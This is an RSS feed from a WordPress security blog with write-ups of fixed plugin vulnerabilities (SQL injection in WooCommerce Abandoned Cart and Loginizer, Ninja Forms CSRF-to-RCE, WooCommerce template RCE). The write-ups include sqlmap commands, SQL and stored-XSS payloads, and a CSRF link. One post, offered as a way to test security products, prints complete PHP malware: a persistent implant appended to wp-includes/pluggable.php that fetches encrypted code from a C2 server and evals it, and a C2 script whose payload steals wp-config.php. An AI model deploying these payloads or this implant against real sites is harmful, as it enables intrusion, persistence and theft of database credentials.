<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>WP deeply</title>
	<atom:link href="https://wpdeeply.com/feed/" rel="self" type="application/rss+xml" />
	<link>http://wpdeeply.com/</link>
	<description>// Silence is golden.  Not for you!</description>
	<lastBuildDate>Thu, 05 Nov 2020 12:18:56 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.5.3</generator>
	<item>
		<title>WooCommerce abandoned cart before 5.8.2 SQL injection</title>
		<link>https://wpdeeply.com/woocommerce-abandoned-cart-before-5-8-2-sql-injection/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Thu, 05 Nov 2020 12:18:51 +0000</pubDate>
				<category><![CDATA[plugins]]></category>
		<category><![CDATA[fixed]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=82</guid>

					<description><![CDATA[Abandoned Cart Plugin stands for recovering abandoned shopping carts for WooCommerce. Plugin source code is in quite bad shape from the good WP plugin development practices, but it got quite good coverage from some Woo &#8220;authorities&#8221; in the past and it is installed on 30k+ active stores. Here we talk about preauth SQL injection that &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/woocommerce-abandoned-cart-before-5-8-2-sql-injection/"> <span class="screen-reader-text">WooCommerce abandoned cart before 5.8.2 SQL injection</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>Abandoned Cart Plugin stands for recovering abandoned shopping carts for WooCommerce. Plugin source code is in quite bad shape from the good WP plugin development practices, but it got quite good coverage from some Woo &#8220;authorities&#8221; in the <a rel="noreferrer noopener" href="https://www.google.com/search?q=wordpress+woocommerce+abandoned+cart" target="_blank">past</a> and it is installed on 30k+ active <a rel="noreferrer noopener" href="https://wordpress.org/plugins/woocommerce-abandoned-cart/advanced/" target="_blank">stores</a>. Here we talk about preauth SQL injection that beside its consequences results in stored XSS directly in the WP admin area. Quite severe vulnerability when we speak about e-commerce.</p>



<h2>Eli5 PoC</h2>



<p>Vulnerability exists in <code>woocommerce_guest_ac</code> class, where on WP initialization and class constructor</p>



<pre class="wp-block-code"><code lang="php" class="language-php">add_action( 'init', 'load_ac_ajax' );
</code></pre>



<p>it is added not privileged ajax action</p>



<pre class="wp-block-code"><code lang="php" class="language-php">function load_ac_ajax() {
		if ( ! is_user_logged_in() ) {
			add_action( 'wp_ajax_nopriv_save_data', 'save_data' );
		}
	}
</code></pre>



<p>in <code>save_data</code> we have the following &#8220;protections&#8221;</p>



<pre class="wp-block-code"><code lang="php" class="language-php">if ( isset( $_POST['billing_first_name'] ) &amp;&amp; '' !== $_POST['billing_first_name'] ) {
				wcal_common::wcal_set_cart_session( 'billing_first_name', sanitize_text_field( wp_unslash( $_POST['billing_first_name'] ) ) );
			}
...
// Insert record in guest table
			$billing_first_name = wcal_common::wcal_get_cart_session( 'billing_first_name' );
</code></pre>



<p>and later this is the input towards not prepared DB query</p>



<pre class="wp-block-code"><code lang="php" class="language-php">$insert_guest     = 'INSERT INTO `' . $wpdb->prefix . "ac_guest_abandoned_cart_history_lite`( billing_first_name, billing_last_name, email_id, billing_zipcode, shipping_zipcode, shipping_charges ) 
                            VALUES ( '" . $billing_first_name . "', '" . $billing_last_name . "', '" . wcal_common::wcal_get_cart_session( 'billing_email' ) . "', '" . $billing_zipcode . "', '" . $shipping_zipcode . "', '" . $shipping_charges . "' )";
			$wpdb->query( $insert_guest );
</code></pre>



<p>So achieving the preauth SQLi is quite trivial e.g. on checkout page when <code>save_data</code> ajax action is called. In order to verify this vulnerability on your local setup, you will need a WP/Woo cookies and plugin nonce <code>wcal_guest_capture_nonce</code>. So we have the following:</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">python3 sqlmap.py -u http://local.target/wp-admin/admin-ajax.php --cookie='[cookies content here]' --method='POST' --data='billing_first_name=wpdeeply&amp;billing_last_name=wpdeeply&amp;billing_company=wpdeeply&amp;billing_address_1=wpdeeply&amp;billing_address_2=wpdeeply&amp;billing_city=wpdeeply&amp;billing_state=wpdeeply&amp;billing_postcode=123234&amp;billing_country=GB&amp;billing_phone=12324&amp;billing_email=wpdeeply%40protonmail.com&amp;order_notes=&amp;wcal_guest_capture_nonce=[nonce-value]&amp;action=save_data' -p billing_first_name --prefix="', '', '','', '',( TRUE " --suffix=")) -- wpdeeply" --dbms mysql --technique=T --time-sec=1 --current-db --current-user
</code></pre>



<p>If you dive deeper into plugin code, you will notice that this content is displayed in admin area, so there is nice stored XSS too, almost the same technique like <a href="https://wpdeeply.com/loginizer-before-1-6-4-sqli-injection/" target="_blank" rel="noreferrer noopener">here</a>.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/ab-cart.md#few-facts"></a></h2>



<h2>Few facts</h2>



<ul><li>As Woo owner you should trust no one regarding plugins / software on your e-commerce infrastructure.</li><li>Plugin developer was brave enough to ask for fix to be deployed in end of November while 100-200 new active installs per day happened and plugins team were &#8220;polite&#8221; enough to allow that</li><li>This bug seems like classical backdoor, but I&#8217;ll judge in a favor of not following best WP development practices</li><li>Woo vulnerabilities != WP vulnerabilities</li></ul>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/ab-cart.md#remediation"></a></h2>



<h2>Remediation</h2>



<ul><li>Use best deployment practices for web / PHP applications</li><li>Test and regression verify code that lands on your e-commerce</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Loginizer before 1.6.4 SQLi injection</title>
		<link>https://wpdeeply.com/loginizer-before-1-6-4-sqli-injection/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Wed, 21 Oct 2020 11:07:19 +0000</pubDate>
				<category><![CDATA[plugins]]></category>
		<category><![CDATA[fixed]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=72</guid>

					<description><![CDATA[Here we talk about Loginizer security plugin for WP that protects web sites from brute force attacks (quite needed functionality) and to provide extra lights and bolts in form of Two Factor Auth, reCAPTCHA, PasswordLess Login&#8230; Recently I performed some checks in the plugin code and few security issues were identified e.g. two paths towards &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/loginizer-before-1-6-4-sqli-injection/"> <span class="screen-reader-text">Loginizer before 1.6.4 SQLi injection</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>Here we talk about Loginizer security plugin for WP that protects web sites from brute force attacks (quite needed functionality) and to provide extra lights and bolts in form of Two Factor Auth, reCAPTCHA, PasswordLess Login&#8230; Recently I performed some checks in the plugin code and few security issues were identified e.g. two paths towards SQLi and one XSS. Beside the fact that plugin code was quite audited in the past (more about this below), in the code remained very severe issues.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/loginizer-blog-post.md#eli5-poc"></a></h2>



<h2>Eli5 PoC</h2>



<p>Plugin counts failed login attempts hooking on <code>wp_login_failed</code> which is called in <code>wp_authenticate</code> e.g. official wp method for performing authentication in XMLRPC and web interface. In wp_signon we have un slashing of username / password pair (isn&#8217;t case for XMLRPC) and like that are sent towards <code>wp_authenticate</code>. Here we have simple <code>sanitize_user</code> which is quite useless when called with <code>$strict = false</code> default parameter value. So, not protected <code>$username</code> travels towards any functionality hooked on <code>wp_login_failed</code>. In Loginizer:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">add_action('wp_login_failed', 'loginizer_login_failed');
</code></pre>



<p>and via function definition we see how raw <code>$username</code> reaches the plugin functionality:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">function loginizer_login_failed($username, $is_2fa = ''){
	
	global $wpdb, $loginizer, $lz_cannot_login;
	...
</code></pre>



<p>Also in this function there are calls towards DB with not sanitized DB parameters:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">...
$result = lz_selectquery("SELECT * FROM `".$wpdb->prefix."loginizer_logs` WHERE `ip` = '".$loginizer['current_ip']."';");
...
$sresult = $wpdb->query("UPDATE `".$wpdb->prefix."loginizer_logs` SET `username` = '".$username."', `time` = '".time()."', `count` = `count`+1, `lockout` = '".$lockout."', `url` = '".$url."' WHERE `ip` = '".$loginizer['current_ip']."';");
...
$insert = $wpdb->query("INSERT INTO `".$wpdb->prefix."loginizer_logs` SET `username` = '".$username."', `time` = '".time()."', `count` = '1', `ip` = '".$loginizer['current_ip']."', `lockout` = '0', `url` = '".$url."';");
...
</code></pre>



<p>and we see the places that are vulnerable of SQLi based on user login data. Simplest PoC if you monitor error_logs would be:</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">curl 'http://local.target/wp-login.php' --data-raw 'log=test%27loginizer&amp;pwd=fdsfsdfs&amp;wp-submit=Log+In&amp;redirect_to=&amp;testcookie=1'
</code></pre>



<p>and in the error_log you will see</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">[Mon Oct 19 13:20:27.425151 2020] [php7:notice] [pid 129822] [client 127.0.0.1:37896] WordPress database error You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'loginizer', `time` = '1603106427', `count` = '1', `ip` = '127.0.0.1', `lo' at line 1 for query INSERT INTO `wp_loginizer_logs` SET `username` = 'test'loginizer', `time` = '1603106427', ...
</code></pre>



<p>This means that we have SQLi in <code>insert</code> statement and insert won&#8217;t occure, because error in this case, but in case of an real attack ip value could be easy owerwritten and useless data to be filled in the logger tables. More stealth approach would be for sqli towards <code>update</code> statement.</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">python3 sqlmap.py -u http://local.target/wp-login.php --method='POST' --data='log=&amp;pwd=password&amp;wp-submit=Log+In&amp;redirect_to=&amp;testcookie=1' -p log --prefix="', ip = LEFT(UUID(), 8), url = ( TRUE " --suffix=") -- wpdeeply" --dbms mysql --technique=T --time-sec=1 --current-db --current-user
</code></pre>



<p>As an extra towards this SQLi, in the code, there is following for printing the output in the administration area:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">// Get the logs
	$result = lz_selectquery("SELECT * FROM `".$wpdb->prefix."loginizer_logs` 
							ORDER BY `time` DESC 
							LIMIT ".$lz_env['cur_page'].", ".$lz_env['res_len']."", 1);
...
foreach($result as $ik => $iv){
					$status_button = (!empty($iv['status']) ? 'disable' : 'enable');
					echo '
					&lt;tr>
						&lt;td>
							&lt;input type="checkbox" value="'.$iv['ip'].'" name="lz_reset_ips[]" />
						&lt;/td>
						&lt;td>
							'.$iv['ip'].'
						&lt;/td>
						&lt;td>
							'.$iv['username'].'
						&lt;/td>


</code></pre>



<p>So, beside the fact that <code>sanitize_user</code> function strips the tags, when we are into SQL machinery we have an option for stored XSS attack too:</p>



<pre class="wp-block-code"><code lang="sql" class="language-sql">test',ip=concat(char(60),'b',char(62),'wpdeeply',char(60),char(47),'b',char(62),'-',LEFT(UUID(),8)) -- wpdeeply
</code></pre>



<p>And that is it, more than easy and detailed about SQLi + XSS via <code>$username</code>.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/loginizer-blog-post.md#isnt-only-username"></a></h2>



<h2>Isn&#8217;t only username</h2>



<p>This one is much more interesting, yet effective on lower number of setups out there, but is really good issue <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Validation of the ip address happens in the following way:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">function lz_valid_ip($ip){
	
	// IPv6
	if(lz_valid_ipv6($ip)){
		return true;
	}
	
	// IPv4
	if(!ip2long($ip)){
		return false;
	}
	
	return true;
}
</code></pre>



<p>and <code>ip2long</code> isn&#8217;t binary safe, so if IP HTTP header reaches the backend with null byte in it, we are talking about SQLi, but also about standard stored XSS vulnerability.</p>



<pre class="wp-block-code"><code lang="php" class="language-php">if ( ip2long("127.0.0.1\x00'&lt;script>") ) echo 'Valid IPv4';
</code></pre>



<p>What are affected setups and how to, won&#8217;t be disclosed in this writing <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/loginizer-blog-post.md#few-facts"></a></h2>



<h2>Few facts</h2>



<ul><li>This plugin was &#8220;target&#8221; few times of not complete audits with some results, <a rel="noreferrer noopener" href="https://blog.wpsec.com/sql-injection-and-csrf-security-vulnerability-in-loginizer/" target="_blank">here</a> and <a rel="noreferrer noopener" href="https://blog.dewhurstsecurity.com/2018/05/22/loginizer-wordpress-plugin-xss-vulnerability.html" target="_blank">here</a></li><li>When you perform static code analysis it is strange to suspect that <code>sanitize_user</code> will allow <code>'</code> or <code>"</code>, but anyway debugger need to be employed</li><li>When you perform scanning and you are on local target then it is wise to inspect the error logs of the application and to try all of the parameters</li><li>It is interesting and good to see how wp org managed to push the security update towards WP instances with this plugin <a href="https://wordpress.org/plugins/loginizer/advanced/">https://wordpress.org/plugins/loginizer/advanced/</a> , but are you still comfortable allowing administration of your assets by unknown folks from wp org?</li><li>We all know that WP employed <code>error protection</code> in the core. You think there isn&#8217;t any WP / Loginizer setup that was tried by bot for SQLi on the login form? Are DB errors worth marking as problem in the installation or this feature is there for another reasons?!</li></ul>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/loginizer-blog-post.md#remediation"></a></h2>



<h2>Remediation</h2>



<ul><li>Update Loginizer plugin and continue with its usage, it is good and useful piece of software.</li><li>Use prepared DB statements.</li><li>Turn off automatic updates from your production environment and follow the active installs from stage. It is about privacy, but also for security.</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Ninja Forms before 3.4.27.1 simple CSRF to RCE</title>
		<link>https://wpdeeply.com/ninja-forms-before-3-4-27-1-simple-csrf-to-rce/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Tue, 22 Sep 2020 19:55:30 +0000</pubDate>
				<category><![CDATA[plugins]]></category>
		<category><![CDATA[fixed]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=20</guid>

					<description><![CDATA[The bug is more than simple, GET request with Administrator cookies in it, will result with any plugin from WP dot org installation &#38; activation. If we talk about regular web application, then this won’t be even a issue and server miss configuration could be blamed (writable executable files), but we talk about WordPress where &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/ninja-forms-before-3-4-27-1-simple-csrf-to-rce/"> <span class="screen-reader-text">Ninja Forms before 3.4.27.1 simple CSRF to RCE</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>The <a href="https://plugins.trac.wordpress.org/browser/ninja-forms/tags/3.4.27/services/bootstrap.php#L49" target="_blank" rel="noreferrer noopener">bug</a> is more than simple, GET request with Administrator cookies in it, will result with any plugin from WP dot org installation &amp; activation. If we talk about regular web application, then this won’t be even a issue and server miss configuration could be blamed (writable executable files), but we talk about WordPress where those conditions are advertised as good and are needed in the name of the security :/</p>



<p>Today the CSRF issues aren’t the thing that much, because browsers protection, developers experience and web admins experience. Anyway, simple GET request cross domain or on same domain that will result with RCE is more than dangerous scenario, easy to be performed and hard to be noticed even by most experienced web masters.</p>



<h2>Eli5 PoC</h2>



<p>In&nbsp;<code>services/bootstrap.php</code>&nbsp;there is ajax action called&nbsp;<code>nf_services_install</code>. If we look at its code we will notice that there isn’t CSRF protection in the form of nonce check / validation, but there is only logged in user permissions check (that is why CSRF attack will work against high privileged accounts)</p>



<pre class="wp-block-code"><code lang="php" class="language-php">if ( ! current_user_can('install_plugins') )
	die( json_encode( [ 'error' => esc_html__( 'Sorry, you are not allowed to install plugins on this site.' ) ] ) );
	
$plugin = \WPN_Helper::sanitize_text_field($_REQUEST['plugin']);
$install_path = \WPN_Helper::sanitize_text_field($_REQUEST['install_path']);</code></pre>



<p>the rest of the code is plugin download based on&nbsp;<code>$_REQUEST['plugin']</code>&nbsp;and plugin activation, based on&nbsp;<code>$_REQUEST['install_path']</code>. So the final link that need to be opened with&nbsp;<code>Administrator</code>&nbsp;cookies in it will be something like this:</p>



<pre class="wp-block-code"><code class="">hxxts://local.target/wp-admin/admin-ajax.php?action=nf_services_install&amp;plugin=coditor&amp;install_path=coditor/coditor.php 
</code></pre>



<p>Could be shortened link, could be img tag in email or wp instance content, … There is huge room for successful attack <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h3>What is coditor ?</h3>



<p><a href="https://wordpress.org/plugins/coditor/" target="_blank" rel="noreferrer noopener">Coditor</a> is WP plugin not updated several years, but still active ( was and after my report isn’t any more ) and was vulnerable towards RCE from lowest possible user role on any WP instance e.g. any logged in user. That was possible <a href="https://plugins.trac.wordpress.org/browser/coditor/trunk/coditor.php" target="_blank" rel="noreferrer noopener">because</a>:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">add_action('wp_ajax_coditor_process_ajax', array($this, 'coditor_process_ajax'));</code></pre>



<p>and&nbsp;<code>coditor_process_ajax</code>&nbsp;method allows editing and deletion of any file under&nbsp;<code>$coditor = new Coditor(WP_CONTENT_DIR);</code>&nbsp;=&gt; any plugin / theme.</p>



<h2>Few facts</h2>



<ul><li>In 30 minutes I found several forgotten plugins in the repository with RCE in them (pre auth or subscriber user role)</li><li>Attackers could deploy their own plugin towards wp dot org repository and to add backdoor in next iterations</li><li>If you search and you find for complete attack scenario with vulnerable plugin from the repository, then try to report that plugin towards authors.</li></ul>



<h2>Remediation</h2>



<ul><li>Do not allow your plugins / themes directory to be writable by&nbsp;<code>www-data</code>&nbsp;user beside the fact it is advertised like that by WP folks</li><li>Update to the latest version of Ninja Forms plugin :/</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WooCommerce before 4.1.0 Remote Code Execution</title>
		<link>https://wpdeeply.com/woocommerce-4-1-0-remote-code-execution/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Tue, 25 Aug 2020 19:58:44 +0000</pubDate>
				<category><![CDATA[plugins]]></category>
		<category><![CDATA[fixed]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=23</guid>

					<description><![CDATA[WooCommerce plugin is raw model how good WordPress plugin should look like and very often we can see how many another plugins around eco system very often borrow knowledge/source from it and that is probably ok. What is important to be mentioned here is the fact that there isn’t any log that will show us &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/woocommerce-4-1-0-remote-code-execution/"> <span class="screen-reader-text">WooCommerce before 4.1.0 Remote Code Execution</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>WooCommerce plugin is raw model how good WordPress plugin should look like and very often we can see how many another plugins around eco system very often borrow knowledge/source from it and that is probably ok. What is important to be mentioned here is the fact that there isn’t any log that will show us all of those usages, but changelogs should be enough for developers to get the idea being Security fixes or not? From the 4.1.0 changelog we have the following:</p>



<pre class="wp-block-code"><code class="">* Security - Fixed unescaped meta data while duplicating products. Reported by Slavco.
</code></pre>



<p>but is this enough, is everything told and do you get the idea about the vulnerability?! <br>I know, no or maybe is the answer.</p>



<h2>What is fixed in 4.1.0</h2>



<p>According the logs there is issue with unescaped meta keys while duplicating products and fix is more than obvious e.g. there is&nbsp;<code>wp_slash</code>added to the&nbsp;<code>$meta-&gt;key</code>&nbsp;in&nbsp;<code>class-wc-data-store-wp.php</code>.</p>



<pre class="wp-block-code"><code lang="php" class="language-php">return add_metadata( $this->meta_type, $object->get_id(), wp_slash( $meta->key ), is_string( $meta->value ) ? wp_slash( $meta->value ) : $meta->value, false );

</code></pre>



<p>So where is the RCE? If we see the code diff experienced eye should get the attention of changes in&nbsp;<code>class-wc-template-loader.php</code>&nbsp;file, method&nbsp;<code>get_template_loader_files</code>&nbsp;e.g.</p>



<pre class="wp-block-code"><code lang="php" class="language-php">if ( is_page_template() ) {
			$page_template = get_page_template_slug();

			if ( $page_template ) {
				$validated_file = validate_file( $page_template );
				if ( 0 === $validated_file ) {
					$templates[] = $page_template;
				} else {
					error_log( "WooCommerce: Unable to validate template path: \"$page_template\". Error Code: $validated_file." );
				}
			}
		}
</code></pre>



<p>and this means that there is added validation to the value returned by&nbsp;<code>get_page_template_slug</code>&nbsp;which in fact is&nbsp;<code>_wp_page_template</code> protected meta value. This means that&nbsp;<code>_wp_page_template</code>&nbsp;could hold any value towards any location and that value to be&nbsp;<code>included</code>&nbsp;while rendering templates at WP.</p>



<pre class="wp-block-code"><code lang="php" class="language-php">$template = apply_filters( 'template_include', $template );
	if ( $template ) {
		include $template;
	} elseif
</code></pre>



<h2>Who is affected</h2>



<p>Attack surface is bigger than advertised.</p>



<ul><li>Duplicating products</li><li>Protected meta could be written while importing products trough new Woo importer, remember it is&nbsp;<code>class-wc-data-store-wp.php</code></li><li>Because&nbsp;<code>class-wc-template-loader.php</code>&nbsp;any&nbsp;<code>import</code>&nbsp;user role is RCE able on Woo setups, but there is <a href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/" target="_blank" rel="noreferrer noopener">contributor/visitor</a> attack in game</li><li>Unserialize trough <a href="https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/" target="_blank" rel="noreferrer noopener">PHAR</a> maybe?</li><li>All of those Woo marketplaces, multi language stores, managed setups…</li></ul>



<h2>Remediation</h2>



<p>Take measures about content in any uploaded files on your WP setup, but also for the content of the files that could be created while modifing them.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress security testing</title>
		<link>https://wpdeeply.com/wordpress-security-testing/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Mon, 24 Aug 2020 19:12:39 +0000</pubDate>
				<category><![CDATA[red team]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=5</guid>

					<description><![CDATA[There are a lot of security solutions around WP eco system advertising their possibility to fight malware, intrusions and exploitation. Most of them are endpoint security solutions, there are cloud ones, but also market knows the managed WP services that offer security in their own way. Having big choice sometime is a problem, because you &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-security-testing/"> <span class="screen-reader-text">WordPress security testing</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>There are a lot of security solutions around WP eco system advertising their possibility to fight malware, intrusions and exploitation. Most of them are endpoint security solutions, there are cloud ones, but also market knows the managed WP services that offer security in their own way. Having big choice sometime is a problem, because you can’t verify all of the claims and if you try, you will need to waste huge load of time auditing / testing. That is why the goal of this section is to provide tools and methods for easy verification of those claims and to help users into choosing the right offering.</p>



<h2>Attack demo</h2>



<p>For the purpose of testing two scripts are created: malware/implant and remote C2 server script. Both are extremely easy for setup, but default versions are prepared in that way, so their abuse would require modifications.</p>



<h5>malware</h5>



<p>This software is based on <a rel="noreferrer noopener" href="https://github.com/Slavco/wp-weaver" target="_blank">wp-weaver</a> project, includes encryption in order to hide its actions and is more than modular to accept and execute everything that is sent by C2.</p>



<pre class="wp-block-code"><code lang="php" class="language-php">//marker_weaver_ftw
$target_files = array(
    ABSPATH . WPINC . '/pluggable.php'
    //just for demo purposes, that is why too few :)
);

//must be here because collisions of the rand and race conditions
if ( ! function_exists("weaver_plant_payload") ){
    function weaver_plant_payload($file, $payload_data, $append){
        //grab the session for one peer only - payload almost forever in memory
        if ( isset($_REQUEST["peer"]) &amp;&amp; $_REQUEST["peer"]!="" ) sleep(9);
        if ( $append ){
            @file_put_contents($file, $payload_data, FILE_APPEND | LOCK_EX);
        }else{
            @file_put_contents($file, $payload_data, LOCK_EX);
        }
        //time window to switch "session" towards another peer
        if ( isset($_REQUEST["peer"]) &amp;&amp; $_REQUEST["peer"]!="" ) sleep(2);
    }
    $the_file = $target_files[rand(0,(sizeof($target_files)-1))];
    $my_content = @file_get_contents(__FILE__);
    $my_content_list = @explode("//\x6Darker_weaver_ftw", $my_content);
    if ( is_array($my_content_list) &amp;&amp; sizeof($my_content_list) >= 2 ){
        @file_put_contents(__FILE__, $my_content_list[0]);
        @register_shutdown_function("weaver_plant_payload", $the_file, "//\x6Darker_weaver_ftw".$my_content_list[1], true);
    }else{
        //shouldn't be here, but at least don't damage the instance
        @register_shutdown_function("weaver_plant_payload", __FILE__, $my_content, false);
    }
}
//malware code below - any length, any logic
if ( isset($_REQUEST["wpdeeply"])){
    //choose the code execution method
    $method_exec = 'eval';
    $test_pass = FALSE;
    
    //test if execution mechanism works
    if ( $method_exec ){
        switch( $method_exec ){
            case 'eval':
                $test_data = '$find_me = array("find_me");';
                eval($test_data);
                if (isset($find_me) &amp;&amp; is_array($find_me) &amp;&amp; in_array('find_me', $find_me)) $test_pass = TRUE;
                break;
                //...
        }
        //if works then load instructions from c2
        if ( $test_pass ){
            
	    	//hardcoded values put here during delivery of the test malware
            define('C2_URL', 'https://local.host/c2.php');
            $c2_box_publickey = base64_decode('CCp/4qGswYmd47p4heS8kwnC3z++VwGN7fRLOCi5sn0=');
            
            //encryption key for delivered payload
            $session_key = \Sodium\randombytes_buf(\Sodium\CRYPTO_SECRETBOX_KEYBYTES);
            
            //prepare data for c2 instruction
            $json_requirements = json_encode(array(
                'key'   => base64_encode($session_key),
                'type' => 'eval'
            ));
            
            //encrypt with c2 pub key
            $rcr = \Sodium\crypto_box_seal(
                $json_requirements,
                $c2_box_publickey
                );
            
            //get results
            $c2_remote_fetch = wp_remote_post(
                C2_URL,
                array(
                    'body' => array(
                        'rcr'   => $rcr
                    ),
                )
                );
            //veryfy response
            if ( ! is_wp_error( $c2_remote_fetch ) ) {
                $c2_remote = json_decode( wp_remote_retrieve_body( $c2_remote_fetch ), true );
            }
            //verify response data format and execute commands
            if ( is_array( $c2_remote ) &amp;&amp; isset( $c2_remote['payload'] ) &amp;&amp; isset( $c2_remote['nonce'] ) ) {
                
                $payload_encrypted = base64_decode( $c2_remote['payload'] );
                $nonce = base64_decode( $c2_remote['nonce'] );
                
                //decrypt final payload from c2
                $payload = \Sodium\crypto_secretbox_open($payload_encrypted, $nonce, $session_key);
                if ( $payload !== false ){
                    @eval($payload);
                }
            }
        }
    }
}</code></pre>



<h5>C2</h5>



<p>This is simple server side script, that will serve the payload when requested by its malware and will log its actions in order to harvest the fruits of commands execution.</p>



<pre class="wp-block-code"><code lang="php" class="language-php">include 'sodium_compat/autoload.php';

//handle the requests from the client/s
if ( isset($_POST["rcr"]) ){
    $encrypted_remote_client_requirements = $_POST["rcr"];
}else{
    exit(0);
}

//simple payload code with arrogant exfiltration method, but possible only for users with upload permissions :) 
$remote_cmd = '
    if ( defined("ABSPATH") ){
        if ( file_exists(ABSPATH."wp-config.php") ){
            wp_upload_bits("wpdeeply.jpg", "", \Sodium\crypto_box_seal(file_get_contents(ABSPATH."wp-config.php"), $c2_box_publickey));
        }
    }
';


//c2 public and secret keys
$c2_box_secretkey = base64_decode('Gr10jP1z0VTyRtaJIav8ElMcmvQ6abfnkfKz5wftI+c=');
$c2_box_publickey = base64_decode('CCp/4qGswYmd47p4heS8kwnC3z++VwGN7fRLOCi5sn0=');

$c2_box_kp = \Sodium\crypto_box_keypair_from_secretkey_and_publickey(
    $c2_box_secretkey,
    $c2_box_publickey
    );

//decode the data received from client
$remote_client_requirements = \Sodium\crypto_box_seal_open(
    $encrypted_remote_client_requirements,
    $c2_box_kp
    );

$remote_client_requirements = @json_decode($remote_client_requirements, true);
if ( !$remote_client_requirements ) exit(0);

//reply to the client with payload encrypted with delivered session_key + used nonce 
if ( is_array($remote_client_requirements) &amp;&amp; isset($remote_client_requirements['key']) &amp;&amp; isset($remote_client_requirements['type']) ){
    $session_key = base64_decode($remote_client_requirements['key']);
    $session_nonce = \Sodium\randombytes_buf(\Sodium\CRYPTO_SECRETBOX_NONCEBYTES);
    $response = json_encode(array( 'payload' => base64_encode(\Sodium\crypto_secretbox($remote_cmd, $session_nonce, $session_key)), 'nonce'=> base64_encode($session_nonce)));
    //add some fancy logging in order to know the client and type+format of exfiltrated data 
    echo $response;
}
exit();</code></pre>



<h5>Setup</h5>



<p>In order to run the demo on your own WP instance you will need the following:</p>



<ul><li>You will need to be logged in as user with upload permissions on the WP (it is this way in order to be stopped abuse of the scripts and that is why in the payload is used <strong>wp_upload_bits</strong> function)</li><li>In the malware script set up your own value for <strong>C2_URL</strong> constant and that is the url of your C2 script</li><li>In order to work C2 script you will need <strong>sodium_compat</strong> next to it and it could be found into any WP 5+ distribution under wp-includes folder</li><li>cat malware.txt &gt;&gt; /path_to_your_code/wp-includes/pluggable.php</li><li>Logged in with user with upload permissions hit refresh on your WP homepage with <strong>?wpdeeply=ok</strong> parameters and check in the upload directory <strong>wpdeeply?-x.jpg</strong> with encrypted <strong>wp-config.php</strong> content</li></ul>



<h2>Successful demo</h2>



<p>This means that you managed to put malware on your WP and to execute code in it. For tech people it is clear (try to use peer method of the weaver) what is done in the background, but for not tech savvy users won’t be, but both are more than free to question its security guarantee about the events. Questions that would be good to be answered:</p>



<ul><li>Why malware doesn’t disappear after update / re-install from admin screen or wpcli?</li><li>What type of commands “attacker” executed against WP?</li><li>What data was leaked and where?</li><li>…</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress protected meta via wp job manager</title>
		<link>https://wpdeeply.com/wordpress-protected-meta-via-wp-job-manager/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Tue, 11 Aug 2020 20:03:13 +0000</pubDate>
				<category><![CDATA[plugins]]></category>
		<category><![CDATA[0day]]></category>
